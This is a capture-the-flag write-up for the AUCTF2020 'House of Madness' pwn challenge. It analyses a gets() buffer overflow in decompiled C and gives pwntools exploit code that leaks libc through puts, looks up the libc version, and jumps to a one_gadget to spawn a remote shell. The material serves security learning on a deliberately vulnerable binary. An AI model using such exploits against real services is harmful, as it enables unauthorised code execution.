## House of Madness

### Description
> Welcome to the House of Madness. Can you pwn your way to the keys to get the relic?
>
> nc challenges.auctf.com 30012
>
> Note: ASLR is disabled for this challenge
>
> Author: kensocolo
>
> Edit: this challenge's binary was originally a little weird. try this again!

### Attachment
[challenge](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/AUCTF2020/pwn/challenge/challenge)

### Analysis

we can `unlockHiddenRoom4` by entering room4 and inputing key `Stephen`

```c
void room4(void){
  int iVar1;
  char local_2c [16];
  char local_1c [20];
  
  puts("Wow this room is special. It echoes back what you say!");
  while( true ) {
    if (unlockHiddenRoom4 != '\0') {
      puts("Welcome to the hidden room! Good Luck");
      printf("Enter something: ");
      gets(local_1c);
      return;
    }
    printf("Press Q to exit: ");
    fgets(local_2c,0x10,stdin);
    remove_newline(local_2c);
    printf("\tYou entered \'%s\'\n",local_2c);
    iVar1 = strcmp(local_2c,"Q");
    if (iVar1 == 0) break;
    iVar1 = strcmp(local_2c,"Stephen");
    if (iVar1 == 0) {
      unlockHiddenRoom4 = '\x01';
    }
  }
  return;
}
```

#### buffer overflow

we got a buffer overflow `gets(local_1c)` after hidden room 4 is unlocked.

#### disabled ASLR

In the Description we know that:

?> Note: **ASLR is disabled** for this challenge

**ASLR is disabled** means the base address of `text` and `libc` is a **constant**:

```python
text = 0x56555000
libc = 0xf7e19000
```

so we can get shell directly by overwrite the return address to one gadget.

### Soultion

#### leak libc

before the attack, we should know the version of remote `libc`. leak it:

```python
offset = cyclic_find('haaa')-8
payload = cyclic(offset)
payload += p32(got)
payload += p32(0xdeadbeef)
payload += p32(text+elf.plt['puts']) + p32(0xdeadbeef) + p32(text+elf.got['puts']) 

sla('Your choice: ','2')
sla('Choose a room to enter: ','4')
sla('Your choice: ','3')
sla('Press Q to exit: ','Stephen')
# debug('b *0x56556684')
sla('Enter something: ',payload)
puts = uu32(rc(4))
info_addr('puts',puts)
```

> output: puts: 0xf7e78b80

find libc version by `libc_database`:

```shell
% ./find puts b80
archive-glibc (id libc6_2.23-0ubuntu3_i386)
```

#### one gadget

search one gadget by `one_gadget`:

```shell
% one_gadget libc6_2.23-0ubuntu3_i386.so 
0x3ac3c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL
```

#### get shell

the constraints is `[esp+0x28] == NULL`, so we should fill stack with `\x00` :

```python
# gadget
og_off = 0x3ac3c
og = libc+og_off

offset = cyclic_find('haaa')
payload = cyclic(offset)
payload += p32(og)
payload += p32(0)*100   # fill stack with '\x00'
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/AUCTF2020/pwn/challenge) 

